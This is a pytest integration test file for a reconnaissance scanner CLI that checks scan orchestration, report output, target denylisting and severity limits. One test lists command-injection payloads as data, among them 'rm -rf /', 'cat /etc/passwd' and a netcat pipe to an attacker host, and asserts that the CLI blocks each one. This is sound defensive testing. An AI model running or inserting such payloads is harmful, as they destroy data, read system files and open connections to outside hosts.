"""TDD: End-to-end integration tests with mock tools."""

import asyncio
import json
import os
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from click.testing import CliRunner

from argus_lite.core.tool_runner import ToolOutput


def _load_fixture(name: str) -> str:
    return (Path(__file__).parent / "fixtures" / name).read_text()


class TestFullScanFlow:
    """Test complete scan flow: orchestrator -> mock tools -> result."""

    def test_orchestrator_with_mock_tools(self):
        from argus_lite.core.config import AppConfig
        from argus_lite.core.orchestrator import ScanOrchestrator

        config = AppConfig()
        orch = ScanOrchestrator(target="example.com", config=config)

        # Inject mock results into recon/analysis stages
        dig_output = _load_fixture("dig_output.txt")
        whois_output = _load_fixture("whois_output.txt")
        subfinder_output = _load_fixture("subfinder_output.txt")

        async def mock_recon():
            from argus_lite.modules.recon.dns import parse_dig_output
            from argus_lite.modules.recon.subdomains import parse_subfinder_output
            from argus_lite.modules.recon.whois import parse_whois_output

            orch._recon_result.dns_records = parse_dig_output(dig_output)
            orch._recon_result.subdomains = parse_subfinder_output(subfinder_output)
            orch._recon_result.whois_info = parse_whois_output(whois_output)
            orch._tools_used.extend(["dig", "whois", "subfinder"])

        naabu_output = _load_fixture("naabu_output.json")
        nuclei_output = _load_fixture("nuclei_output.json")

        async def mock_analysis():
            from argus_lite.modules.analysis.nuclei import parse_nuclei_output
            from argus_lite.modules.analysis.ports import parse_naabu_output

            orch._analysis_result.open_ports = parse_naabu_output(naabu_output)
            orch._analysis_result.nuclei_findings = parse_nuclei_output(nuclei_output)
            orch._tools_used.extend(["naabu", "nuclei"])

        with patch.object(orch, "_run_recon", side_effect=mock_recon), \
             patch.object(orch, "_run_analysis", side_effect=mock_analysis):
            result = asyncio.get_event_loop().run_until_complete(orch.run())

        assert result.status == "completed"
        assert len(result.recon.dns_records) == 7
        assert len(result.recon.subdomains) == 7
        assert result.recon.whois_info.domain == "example.com"
        assert len(result.analysis.open_ports) == 5
        assert len(result.analysis.nuclei_findings) == 4
        assert "dig" in result.tools_used
        assert "nuclei" in result.tools_used

    def test_report_generation_from_scan(self):
        """Test that scan result can produce all 3 report formats."""
        from argus_lite.core.config import AppConfig
        from argus_lite.core.orchestrator import ScanOrchestrator
        from argus_lite.modules.report.html_report import generate_html_report
        from argus_lite.modules.report.json_report import generate_json_report
        from argus_lite.modules.report.markdown_report import generate_markdown_report

        config = AppConfig()
        orch = ScanOrchestrator(target="example.com", config=config)

        with patch.object(orch, "_run_recon", new_callable=AsyncMock), \
             patch.object(orch, "_run_analysis", new_callable=AsyncMock):
            result = asyncio.get_event_loop().run_until_complete(orch.run())

        # All formats should work even on empty result
        json_out = generate_json_report(result)
        assert json.loads(json_out)["target"] == "example.com"

        md_out = generate_markdown_report(result)
        assert "# Security Scan Report" in md_out

        html_out = generate_html_report(result)
        assert "<html" in html_out

    def test_report_write_to_disk(self, tmp_path):
        """Test writing all report formats to files."""
        from argus_lite.core.config import AppConfig
        from argus_lite.core.orchestrator import ScanOrchestrator
        from argus_lite.modules.report.html_report import write_html_report
        from argus_lite.modules.report.json_report import write_json_report
        from argus_lite.modules.report.markdown_report import write_markdown_report

        config = AppConfig()
        orch = ScanOrchestrator(target="example.com", config=config)

        with patch.object(orch, "_run_recon", new_callable=AsyncMock), \
             patch.object(orch, "_run_analysis", new_callable=AsyncMock):
            result = asyncio.get_event_loop().run_until_complete(orch.run())

        write_json_report(result, tmp_path / "report.json")
        write_markdown_report(result, tmp_path / "report.md")
        write_html_report(result, tmp_path / "report.html")

        assert (tmp_path / "report.json").exists()
        assert (tmp_path / "report.md").exists()
        assert (tmp_path / "report.html").exists()


class TestCLIIntegration:
    """Test CLI commands end-to-end."""

    def test_scan_command_with_no_confirm(self):
        from argus_lite.cli import main

        runner = CliRunner()
        result = runner.invoke(main, ["scan", "example.com", "--no-confirm"])
        assert result.exit_code == 0
        assert "legal notice" in result.output.lower() or "authorized" in result.output.lower()

    def test_scan_rejects_denylist_target(self, tmp_path):
        from argus_lite.cli import main

        # Create denylist
        argus_home = tmp_path / ".argus-lite"
        argus_home.mkdir()
        (argus_home / "denylist.txt").write_text("evil.com\n")

        runner = CliRunner()
        result = runner.invoke(
            main, ["scan", "evil.com", "--no-confirm"],
            env={"ARGUS_HOME": str(argus_home)},
        )
        # Should fail due to denylist
        assert result.exit_code != 0 or "denylist" in result.output.lower()

    def test_init_then_config_show(self):
        from argus_lite.cli import main

        runner = CliRunner()
        with runner.isolated_filesystem():
            os.environ["ARGUS_HOME"] = os.getcwd()
            init_result = runner.invoke(main, ["init"])
            assert init_result.exit_code == 0

            config_result = runner.invoke(main, ["config", "show"])
            assert config_result.exit_code == 0
            del os.environ["ARGUS_HOME"]

    def test_version_output(self):
        from argus_lite.cli import main

        runner = CliRunner()
        result = runner.invoke(main, ["--version"])
        assert "1.0.0" in result.output


class TestSecurityEnforcement:
    """Integration tests for security enforcement across the stack."""

    def test_injection_blocked_at_cli(self):
        from argus_lite.cli import main

        runner = CliRunner()
        payloads = [
            "test.com; rm -rf /",
            "$(whoami).evil.com",
            "`cat /etc/passwd`",
            "test.com | nc attacker 4444",
        ]
        for payload in payloads:
            result = runner.invoke(main, ["scan", payload, "--no-confirm"])
            assert result.exit_code != 0, f"Payload not blocked: {payload}"

    def test_nuclei_severity_ceiling_in_parser(self):
        from argus_lite.modules.analysis.nuclei import parse_nuclei_output

        mixed_output = (
            '{"template-id":"a","info":{"name":"A","severity":"info","tags":[]},"type":"http","host":"x","matched-at":"x"}\n'
            '{"template-id":"b","info":{"name":"B","severity":"medium","tags":[]},"type":"http","host":"x","matched-at":"x"}\n'
            '{"template-id":"c","info":{"name":"C","severity":"critical","tags":[]},"type":"http","host":"x","matched-at":"x"}\n'
        )
        findings = parse_nuclei_output(mixed_output)
        assert len(findings) == 1
        assert findings[0].severity == "info"

    def test_finding_model_rejects_high_severity(self):
        from pydantic import ValidationError

        from argus_lite.models.finding import Finding

        with pytest.raises(ValidationError):
            Finding(
                id="f1", type="test", severity="HIGH", title="T",
                description="D", asset="a", evidence="e", source="s",
                remediation="r",
            )

    def test_nuclei_config_rejects_medium(self):
        from pydantic import ValidationError

        from argus_lite.core.config import NucleiToolConfig

        with pytest.raises(ValidationError):
            NucleiToolConfig(severity=["info", "low", "medium"])
